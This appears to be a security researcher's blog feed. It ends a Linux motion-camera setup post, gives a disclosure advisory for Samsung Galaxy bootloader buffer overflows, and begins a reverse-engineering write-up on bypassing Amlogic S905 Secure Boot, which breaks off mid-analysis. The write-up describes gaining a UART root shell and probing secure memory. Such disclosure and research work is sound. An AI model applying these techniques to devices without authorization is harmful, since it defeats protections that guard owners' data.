&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;$CONNECTED&lt;/span&gt; -eq &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
 &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt; is connected&amp;quot;&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$PID&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;
 &lt;span class="k"&gt;then&lt;/span&gt;
      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$CMD&lt;/span&gt;&lt;span class="s2"&gt; is running, stopping it...&amp;quot;&lt;/span&gt;
      start-stop-daemon -K -x &lt;span class="nv"&gt;$CMD_BIN&lt;/span&gt; -p &lt;span class="nv"&gt;$CMD_PID&lt;/span&gt;
 &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt;
 &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt; is disconnected&amp;quot;&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -z &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$PID&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;
 &lt;span class="k"&gt;then&lt;/span&gt;
      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$CMD&lt;/span&gt;&lt;span class="s2"&gt; is not running, starting it...&amp;quot;&lt;/span&gt;
      start-stop-daemon -S -x &lt;span class="nv"&gt;$CMD_BIN&lt;/span&gt; -- -b -p &lt;span class="nv"&gt;$CMD_PID&lt;/span&gt;
 &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;$HWADDR&lt;/strong&gt; has to be set to MAC address of our smartphone.&lt;/p&gt;
&lt;p&gt;As failsafe mechanism, we can also add this script to cron :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  0 *  *   *   *     /etc/motion_cron.sh&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; /etc/crontabs/root
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finally, we edit the file &lt;em&gt;/etc/motion/motion.conf&lt;/em&gt; to configure motion. A &lt;a href="http://htmlpreview.github.io/?https://github.com/Motion-Project/motion/blob/master/motion_guide.html"&gt;guide is available on official motion website&lt;/a&gt;.
In addition of your own settings, I recommend to set the output storage path to an external USB drive :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;target_dir /mnt/sda1
&lt;/pre&gt;&lt;/div&gt;</content><category term="kernel"></category><category term="netgear"></category><category term="usb"></category><category term="v4l2"></category></entry><entry><title>SVE-2016-7930: Multiple buffer overflows in Samsung Galaxy bootloader</title><link href="https://fredericb.info/2017/07/sve-2016-7930-multiple-buffer-overflows-in-samsung-galaxy-bootloader.html" rel="alternate"></link><published>2017-07-23T00:00:00-07:00</published><updated>2017-07-23T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2017-07-23:/2017/07/sve-2016-7930-multiple-buffer-overflows-in-samsung-galaxy-bootloader.html</id><summary type="html">&lt;h1&gt;Prequel&lt;/h1&gt;
&lt;p&gt;On October 21st 2015, mobile forensics company &lt;a href="https://www.cellebrite.com/"&gt;Cellebrite&lt;/a&gt; published a video that demonstrates how their solution can dump eMMC of Samsung Galaxy devices :&lt;/p&gt;
&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/ZsGBbswJGi4?rel=0" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;This video strongly suggests that Samsung Galaxy bootloader can be exploited to execute arbitrary code.&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;Several bugs in Samsung Galaxy bootloader allow an attacker with …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Prequel&lt;/h1&gt;
&lt;p&gt;On October 21st 2015, mobile forensics company &lt;a href="https://www.cellebrite.com/"&gt;Cellebrite&lt;/a&gt; published a video that demonstrates how their solution can dump eMMC of Samsung Galaxy devices :&lt;/p&gt;
&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/ZsGBbswJGi4?rel=0" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;This video strongly suggests that Samsung Galaxy bootloader can be exploited to execute arbitrary code.&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;Several bugs in Samsung Galaxy bootloader allow an attacker with physical access to execute arbitrary code. Protections like OS lock screen and reactivation lock can be defeated.&lt;/p&gt;
&lt;p&gt;Download mode (a.k.a. ODIN) doesn't properly sanitize headers of flashed images. This can lead to integer &amp;amp; buffer overflows.&lt;/p&gt;
&lt;p&gt;Bugs and exploitation technique are detailed in the &lt;a href="https://www.sstic.org/media/SSTIC2017/SSTIC-actes/attacking_samsung_secure_boot/SSTIC2017-Article-attacking_samsung_secure_boot-basse.pdf"&gt;paper released at SSTIC 2017 conference&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Proof-of-Concept&lt;/h1&gt;
&lt;p&gt;PoC code for Samsung Galaxy S5 has been &lt;a href="https://github.com/frederic/SVE-2016-7930"&gt;released on GitHub&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;CVSS Version 3 Metrics&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Attack Vector (AV): Physical (P)&lt;/li&gt;
&lt;li&gt;Attack Complexity (AC): Low (L)&lt;/li&gt;
&lt;li&gt;Privileges Required (PR): None (N)&lt;/li&gt;
&lt;li&gt;User Interaction (UI): None (N)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"&gt;Overall CVSS Score: 6.8&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Solution&lt;/h1&gt;
&lt;p&gt;Samsung has released a fix via OTA.&lt;/p&gt;
&lt;h1&gt;Disclosure Timeline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;2016-12-20 Disclosed to Samsung&lt;/li&gt;
&lt;li&gt;2017-03-07 Public disclosure in Samsung Bulletin &lt;a href="https://security.samsungmobile.com/securityUpdate.smsb"&gt;SMR-MAR-2017&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2017-06-08 Talk at &lt;a href="https://www.sstic.org/2017/presentation/attacking_samsung_secure_boot/"&gt;SSTIC 2017 conference&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2017-07-21 &lt;a href="https://github.com/frederic/SVE-2016-7930"&gt;Proof-of-Concept released&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="samsung"></category><category term="cellebrite"></category><category term="bootloader"></category><category term="exploit"></category><category term="firmware"></category><category term="security"></category><category term="usb"></category><category term="arm"></category><category term="odin"></category></entry><entry><title>Amlogic S905 SoC: bypassing the (not so) Secure Boot to dump the BootROM</title><link href="https://fredericb.info/2016/10/amlogic-s905-soc-bypassing-not-so.html" rel="alternate"></link><published>2016-10-05T00:00:00-07:00</published><updated>2016-10-05T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2016-10-05:/2016/10/amlogic-s905-soc-bypassing-not-so.html</id><summary type="html">&lt;p&gt;The &lt;a href=
"http://www.amlogic.com/#Products/176/index.html"&gt;Amlogic S905
System-On-Chip&lt;/a&gt; is an ARM processor designed for video
applications. It's widely used in Android/Kodi media boxes. The SoC
implements the TrustZone security extensions to run a Trusted
Execution Environment (TEE) that enables DRM &amp;amp; other security
features :&lt;br&gt;
&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="S905 block diagram" src="https://fredericb.info/blog/amlogic-sb/S905_arch.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Amlogic S905
System Block Diagram&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
The SoC contains a Secure …&lt;/p&gt;</summary><content type="html">&lt;p&gt;The &lt;a href=
"http://www.amlogic.com/#Products/176/index.html"&gt;Amlogic S905
System-On-Chip&lt;/a&gt; is an ARM processor designed for video
applications. It's widely used in Android/Kodi media boxes. The SoC
implements the TrustZone security extensions to run a Trusted
Execution Environment (TEE) that enables DRM &amp;amp; other security
features :&lt;br&gt;
&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="S905 block diagram" src="https://fredericb.info/blog/amlogic-sb/S905_arch.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Amlogic S905
System Block Diagram&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
The SoC contains a Secure Boot mechanism to authenticate the TEE
image before loading it in TrustZone. And the first link of this
Secure Boot chain is the BootROM code, stored directly in the
chip.&lt;br&gt;
&lt;span style="background-color: red;"&gt;&lt;br&gt;&lt;/span&gt;This articles
describes how to extract the BootROM code from this SoC in the
Android-based&amp;nbsp;&lt;a href="http://www.inphic.com/"&gt;Inphic Spot i7
device&lt;/a&gt;.&lt;br&gt;
&lt;h2&gt;Technical documentation&lt;/h2&gt;
Amlogic released a public version of the S905 datasheet thanks to
&lt;a href=
"http://www.hardkernel.com/main/products/prdt_info.php?g_code=G145457216438&amp;amp;tab_idx=2"&gt;
Hardkernel&lt;/a&gt;. However, it's heavily redacted, and most parts
regarding the Secure Boot or the TrustZone have been removed. But
we can still find a lot of technical information in GPL source code
packages released by &lt;a href=
"http://openlinux.amlogic.com:8000/download/ARM/"&gt;Amlogic&lt;/a&gt; &amp;amp;
&lt;a href=
"https://github.com/150balbes/Amlogic_s905-kernel"&gt;OEMs&lt;/a&gt;.&lt;br&gt;
For example, we can find a potential address for the BootROM
code:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define ROMBOOT_START   0xD9040000&lt;/span&gt;
&lt;span class="cp"&gt;#define ROM_SIZE        (64 * 1024)&lt;/span&gt;
&lt;span class="cp"&gt;#define ROMBOOT_END     (ROMBOOT_START + ROM_SIZE)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Root access over the UART&lt;/h2&gt;

&lt;p&gt;We start by connecting the serial port (or UART) because this
interface could provide a quick &amp;amp; easy access to debug messages &amp;amp;
serial console on bootloaders and Linux kernel.&lt;br&gt;
&lt;a href=
"http://www.devttys0.com/2012/11/reverse-engineering-serial-ports/"&gt;
Identifying the serial port&lt;/a&gt;&amp;nbsp;on this board is quite simple
since there is a port header with labels for the pinout:&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="UART" src="https://fredericb.info/blog/amlogic-sb/uart_header.jpg"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;UART on Inphic
Spot i7 board&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
We connect an USB to UART adapter to this port. Once the Linux
kernel boot process is finished, we have directly access to a root
shell.&lt;br&gt;
We can start to explore the (Non-Secure side of the)
system.&amp;nbsp;For example, we can dump the partitions :&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@p200:/# ls -l /dev/block/platform/d0074000.emmc/
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 boot -&amp;gt; /dev/block/boot
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 bootloader -&amp;gt; /dev/block/bootloader
drwxr-xr-x root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 by-num
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 cache -&amp;gt; /dev/block/cache
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 crypt -&amp;gt; /dev/block/crypt
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 data -&amp;gt; /dev/block/data
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 env -&amp;gt; /dev/block/env
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 instaboot -&amp;gt; /dev/block/instaboot
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 logo -&amp;gt; /dev/block/logo
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 misc -&amp;gt; /dev/block/misc
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 mmcblk0 -&amp;gt; /dev/block/mmcblk0
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 mmcblk0boot0 -&amp;gt; /dev/block/mmcblk0boot0
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 mmcblk0boot1 -&amp;gt; /dev/block/mmcblk0boot1
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 mmcblk0rpmb -&amp;gt; /dev/block/mmcblk0rpmb
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 recovery -&amp;gt; /dev/block/recovery
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 reserved -&amp;gt; /dev/block/reserved
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 rsv -&amp;gt; /dev/block/rsv
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 system -&amp;gt; /dev/block/system
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 tee -&amp;gt; /dev/block/tee
&lt;/pre&gt;&lt;/div&gt;


&lt;div&gt;While the&amp;nbsp;&lt;i&gt;tee&lt;/i&gt; partition (Trusted Execution
Environment) turns out to be empty, the &lt;i&gt;bootloader&lt;/i&gt; partition
contains several bootloaders. But not the BootROM&amp;nbsp;because it's
stored in the SoC, not the flash.&lt;/div&gt;

&lt;h2&gt;(Fail at) Reading the BootROM&lt;/h2&gt;

&lt;p&gt;Since we have root permissions and a potential memory address for
the BootROM, we can try to read it directly. The provided Android
ROM contains a handy debugfs interface to peek &amp;amp; poke physical
memory from user-land:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@p200:/# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;d0070000&amp;quot;&lt;/span&gt; &amp;gt;/sys/kernel/debug/aml_reg/paddr               
root@p200:/# cat /sys/kernel/debug/aml_reg/paddr                             
&lt;span class="o"&gt;[&lt;/span&gt;0xd0070000&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0x1000254
&lt;/pre&gt;&lt;/div&gt;


&lt;div&gt;This &lt;i&gt;aml_reg&lt;/i&gt; driver uses the &lt;i&gt;ioremap&lt;/i&gt; kernel
function to set up an appropriate kernel page-table mapping for the
requested address.&lt;/div&gt;

&lt;div&gt;&lt;br&gt;&lt;/div&gt;

&lt;div&gt;However, if we try to read the
hypothetical&amp;nbsp;BootROM&amp;nbsp;area:&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@p200:/# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;d9040000&amp;quot;&lt;/span&gt; &amp;gt;/sys/kernel/debug/aml_reg/paddr
root@p200:/# cat /sys/kernel/debug/aml_reg/paddr
&lt;span class="o"&gt;[&lt;/span&gt;  &lt;span class="m"&gt;376&lt;/span&gt;.546491@0&lt;span class="o"&gt;]&lt;/span&gt; Unhandled fault: synchronous external abort &lt;span class="o"&gt;(&lt;/span&gt;0x96000010&lt;span class="o"&gt;)&lt;/span&gt; at 0xffffff80001aa000
&lt;span class="o"&gt;[&lt;/span&gt;  &lt;span class="m"&gt;376&lt;/span&gt;.549396@0&lt;span class="o"&gt;]&lt;/span&gt; Internal error: : &lt;span class="m"&gt;96000010&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="c1"&gt;#1] PREEMPT SMP&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;  &lt;span class="m"&gt;376&lt;/span&gt;.554712@0&lt;span class="o"&gt;]&lt;/span&gt; Modules linked in: dwc_otg dhd&lt;span class="o"&gt;(&lt;/span&gt;O&lt;span class="o"&gt;)&lt;/span&gt; aml_thermal&lt;span class="o"&gt;(&lt;/span&gt;O&lt;span class="o"&gt;)&lt;/span&gt; mali&lt;span class="o"&gt;(&lt;/span&gt;O&lt;span class="o"&gt;)&lt;/span&gt; aml_nftl_dev&lt;span class="o"&gt;(&lt;/span&gt;PO&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&amp;nbsp;
&lt;div&gt;The kernel crashes. So either the&amp;nbsp;BootROM&amp;nbsp;address is
wrong or this memory area is set as &lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.prd29-genc-009492c/ch03s03s02.html"&gt;
secure&lt;/a&gt;.&lt;/div&gt;
&lt;div&gt;Since we don't have other candidates for
the&amp;nbsp;BootROM&amp;nbsp;address, let's say the&amp;nbsp;BootROM&amp;nbsp;area
is not accessible from&amp;nbsp;the&amp;nbsp;Non-Secure World.&lt;/div&gt;
&lt;h2&gt;Enter the Secure World&lt;/h2&gt;
&lt;div&gt;In theory, the Secure Boot chain prevents loading unauthorized
code in the Secure World.&lt;br&gt;
A quick inspection of debug logs from the UART during the early
phases of boot indicates that the bootloaders are based on
the&amp;nbsp;&lt;a href=
"https://github.com/ARM-software/arm-trusted-firmware"&gt;ARM Trusted
Firmware (ATF)&lt;/a&gt; reference implementation.&lt;/div&gt;
&lt;div&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="ARM Trusted Firmware Design" src="https://fredericb.info/blog/amlogic-sb/securebootflow.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;ARM Trusted
Firmware Design&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
We will now explore some ways to get access to Secure World.&lt;br&gt;
&lt;h2&gt;U-Boot bootloader&lt;/h2&gt;
Using the console over UART, we can interrupt the U-Boot boot
sequence to access to the prompt. From here we can run arbitrary
U-boot commands:&lt;br&gt;
&lt;blockquote class="tr_bq"&gt;Hit any key to stop autoboot: 0&lt;br&gt;
gxb_p200_v1#help&lt;br&gt;
? &amp;nbsp; &amp;nbsp; &amp;nbsp; - alias for 'help'&lt;br&gt;
aml_sysrecovery- Burning with amlogic format package from partition
sysrecovery&lt;br&gt;
amlmmc &amp;nbsp;- AMLMMC sub system&lt;br&gt;
amlnf &amp;nbsp; - aml nand sub-system&lt;br&gt;
amlnf_test- AMLPHYNAND sub-system&lt;br&gt;
autoping- do auto ping test&lt;br&gt;
autoscr - run script from memory&lt;/blockquote&gt;
However the U-Boot bootloader (named BL33 in the ATF design) runs
in Non-Secure mode as we can see in boot logs from the UART
console:&lt;/div&gt;
&lt;div&gt;
&lt;blockquote&gt;INFO: &amp;nbsp; &amp;nbsp;BL3-1: Preparing for EL3 exit to
normal world&lt;br&gt;
INFO: &amp;nbsp; &amp;nbsp;BL3-1: Next image address = 0x1000000&lt;br&gt;
INFO: &amp;nbsp; &amp;nbsp;BL3-1: Next image spsr = 0x3c9&lt;br&gt;
&lt;br&gt;
U-Boot 2015.01-ga9e9562-dirty (May 06 2016 - 03:36:02)&lt;/blockquote&gt;
So at this point we are already locked out of the Secure World.
Next.&lt;br&gt;
&lt;h2&gt;SMC interface&lt;/h2&gt;
Secure &amp;amp; Non-Secure Worlds can communicate through the ARM Secure
Monitor Call (SMC). When a core executes the SMC instruction, it
switches to Secure Monitor mode (exception level EL3).&lt;/div&gt;
&lt;div&gt;In the ATF design, the code that runs in EL3 is named the Boot
Loader stage 3-1 (BL31). We can find this image in the
&lt;i&gt;bootloader&lt;/i&gt; partition we've dumped previously. This code is
highly critical for TrustZone security so we should explore it.&lt;br&gt;
&lt;br&gt;
The open-source ATF code base in the BL31 image facilitates the
analysis by reverse engineering, since we can quickly recover the
ATF code structure.&lt;br&gt;
Here is the list of registered services that handle SMC interrupts
from Normal World:&lt;br&gt;
&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/rt_svc_descs.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Registered
services in BL31 image&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
The &lt;i&gt;sip_svc&lt;/i&gt; service&amp;nbsp;is interesting because it contains
several custom functions developed by Amlogic:&lt;br&gt;
&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/sip_svc_plat_ops.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;List of handlers
in the SIP service&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
At first glance, functions&amp;nbsp;&lt;i&gt;hdcp22_sec_read_reg&lt;/i&gt;
&amp;amp;&amp;nbsp;&lt;i&gt;hdcp22_sec_write_reg&lt;/i&gt; look promising because they
are read &amp;amp; write primitives for the secure memory. However, they
strictly restrict access to specific memory ranges:&lt;br&gt;
&lt;div class="separator" style="clear: both; text-align: center;"&gt;
&lt;/div&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/hdcp22_sec_read_reg.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;
Function&amp;nbsp;hdcp22_sec_read_reg decompiled&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
A quick (incomplete) analysis of other functions didn't reveal any
trivial flaw in parameters sanitization (arbitrary read/write
bugs). Some of them are quite complex, especially the cryptographic
functions, so they have not been inspected at all.&lt;br&gt;
&lt;br&gt;
We may be able to trigger Secure World memory corruption from the
Normal World&amp;nbsp;if &lt;a href=
"http://www.fredericb.info/2014/12/qpsiir-80-qualcomm-trustzone-integer.html"&gt;
we find bugs&lt;/a&gt;&amp;nbsp;in one of these functions, and then achieve
privilege escalation to Secure World. However that would require
some expert skills to &lt;a href=
"http://bits-please.blogspot.fr/2016/05/qsee-privilege-escalation-vulnerability.html"&gt;
actually exploit them&lt;/a&gt;. So let's explore another attack
vector.&lt;br&gt;
&lt;h2&gt;Bypass the Secure Boot chain&lt;/h2&gt;
&lt;/div&gt;
&lt;div&gt;Another solution to get access to the Secure World is to
break/bypass/fool/kindly ask the Secure Boot chain at one of its
stage. A common attack surface of a Secure Boot chain is the
loading, parsing and authentication steps of the next stage.&lt;/div&gt;
&lt;div&gt;&lt;br&gt;&lt;/div&gt;
&lt;div&gt;We don't have access to BL1 code (yet!) since it's stored in
the SoC. But we have the BL2 image from
the&amp;nbsp;&lt;i&gt;bootloader&lt;/i&gt;&amp;nbsp;partition we have dumped
previously. So we will analyze the mechanism used by BL2 to parse
and authenticate the BL31 image in the hope of finding interesting
flaws.&lt;br&gt;
&lt;br&gt;
Here start the lengthy process of reverse engineering a binary
without any syscall and very few strings to guide our efforts.
Fortunately, the BL2 image is quite small: ~40KB. And we have some
ideas to save time:&lt;/div&gt;
&lt;div&gt;&lt;span style="background-color: red;"&gt;&lt;br&gt;&lt;/span&gt;Like BL31, the
BL2 image follows the ATF code logic, so reverse engineering
efforts are a bit simplified: we can quickly spot main functions &amp;amp;
structures defined in the ATF code base.&lt;/div&gt;
&lt;div&gt;&lt;br&gt;&lt;/div&gt;
&lt;div&gt;Another RE trick is to identify the memory-mapped devices
accessed by functions to deduce their role.&lt;/div&gt;
&lt;div&gt;Several address ranges of these memory areas can be found in
the SoC datasheet and the &lt;a href=
"https://github.com/150balbes/Amlogic_S905-u-boot/blob/32cbae9c92a0a5b5a5d0f58f8fd3ca31d1f9ce66/arch/arm/include/asm/arch-gxb/secure_apb.h"&gt;
GPL source code&lt;/a&gt;. For example, we can expect that cryptographic
functions access memory registers dedicated to the hardware
cryptographic engine.&lt;br&gt;
&lt;br&gt;
Finally, we don't want to spend time reversing open source code,
especially cryptographic code because the task is quite hard. And
since it's also complex from the developer perspective, we can
expect they used a library, which may be open source. So we looked
for similarities in function prototypes, call sequence &amp;amp;
initialization of context structures between BL2 code and few
potential OSS libraries. In our case, we quickly figured out that
the&amp;nbsp;cryptographic&amp;nbsp;code comes from the &lt;a href=
"https://tls.mbed.org/"&gt;OSS PolarSSL/mbed TLS project&lt;/a&gt;.&lt;br&gt;
&lt;div&gt;&lt;br&gt;&lt;/div&gt;
&lt;h3&gt;Analyzing BL2 authentication routine&lt;/h3&gt;
Once BL2 has loaded the BL3 image from the NAND, the header is
parsed. We don't have any information on the header structure yet
(not present in the ATF code), but we can notice it starts with a
constant &lt;i&gt;magic&lt;/i&gt; value "&lt;b&gt;@AML&lt;/b&gt;". This helps to quickly
locate the parsing code in the BL2 binary.&lt;br&gt;
We combine "guessing" (i.e. looking at the BL31 header in a hex
editor) and reverse engineering of the BL2 parsing code to figure
out some members of the header structure:&lt;br&gt;&lt;/p&gt;
